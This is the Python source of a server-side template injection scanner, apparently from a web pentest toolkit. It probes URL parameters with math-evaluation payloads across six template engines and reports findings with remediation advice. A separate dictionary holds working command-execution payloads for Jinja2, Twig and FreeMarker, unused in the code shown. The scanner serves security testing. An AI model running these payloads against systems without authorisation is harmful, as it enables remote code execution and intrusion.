#!/usr/bin/env python3
"""
Advanced SSTI Scanner (Server-Side Template Injection)
-------------------------------------------------------
Tests for SSTI across multiple template engines:
  • Jinja2 (Python)
  • Twig (PHP)
  • FreeMarker (Java)
  • Velocity (Java)
  • Smarty (PHP)
  • EJS (Node.js)
"""

import requests
import random
from typing import List, Dict, Optional
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()

# We use random math evaluations to avoid false positives with WAFs/cache
rand1 = random.randint(1000, 9999)
rand2 = random.randint(1000, 9999)
expected_result = str(rand1 * rand2)

# Dictionary of engine to a list of payloads that evaluate to expected_result
SSTI_PAYLOADS = {
    "Jinja2/Twig": [
        f"{{{{ {rand1} * {rand2} }}}}",
        f"{{{{ {rand1}*{rand2} }}}}",
    ],
    "FreeMarker/Velocity": [
        f"${{ {rand1} * {rand2} }}",
        f"${{{rand1}*{rand2}}}",
    ],
    "Smarty": [
        f"{{math equation='x*y' x={rand1} y={rand2}}}",
    ],
    "EJS": [
        f"<%= {rand1} * {rand2} %>",
    ],
    "Ruby ERB": [
        f"<%= {rand1} * {rand2} %>",
    ],
}

# Advanced execution payloads (if evaluation succeeds)
EXEC_PAYLOADS = {
    "Jinja2": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
    "Twig": "{{ ['id']|filter('system') }}",
    "FreeMarker": '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
}


class AdvancedSSTIScanner:
    def __init__(self, target: str, session=None, timeout: int = 10, threads: int = 5):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.threads = threads
        self.session = session or requests.Session()
        self.session.verify = False
        self.session.headers.setdefault("User-Agent", "WebPwnToolkit/2.2")
        self.results: List[Dict] = []

    def _test_param(self, url: str, param: str) -> List[Dict]:
        findings = []
        for engine, payloads in SSTI_PAYLOADS.items():
            for payload in payloads:
                try:
                    resp = self.session.get(
                        url, params={param: payload}, timeout=self.timeout, verify=False
                    )
                    if not resp:
                        continue

                    if expected_result in resp.text:
                        findings.append(
                            {
                                "url": url,
                                "type": f"SSTI — Template Evaluation ({engine})",
                                "severity": "critical",
                                "cvss": 9.8,
                                "parameter": param,
                                "payload": payload,
                                "detail": f"Template engine ({engine}) evaluated mathematical expression. RCE is highly likely.",
                                "evidence": f"Expected: {expected_result}, Found in response.",
                                "owasp": "A03:2021 – Injection",
                                "remediation": "Use logic-less templates (e.g., Mustache) or strict sandboxing. Never pass user input directly into template render functions.",
                            }
                        )
                        return findings  # Stop testing other payloads for this param if one succeeds
                except Exception:
                    pass
        return findings

    def run(self) -> List[Dict]:
        console.print(
            f"\n  [bold yellow]▶ Advanced SSTI Scanner on {self.target}[/bold yellow]"
        )

        # In a real run, these parameters would come from a crawler
        test_params = ["name", "q", "query", "id", "user", "template", "msg", "content"]

        with Progress(
            SpinnerColumn(),
            TextColumn("[cyan]SSTI scanning...[/cyan]"),
            BarColumn(),
            console=console,
        ) as prog:
            task = prog.add_task("ssti", total=len(test_params))
            for param in test_params:
                prog.advance(task)
                res = self._test_param(self.target, param)
                for r in res:
                    if r not in self.results:
                        self.results.append(r)
                        console.print(f"  [bold red][!] {r['type']}[/bold red]")

        color = "red" if self.results else "green"
        console.print(f"  [{color}]{len(self.results)} SSTI issue(s) found[/]")
        return self.results
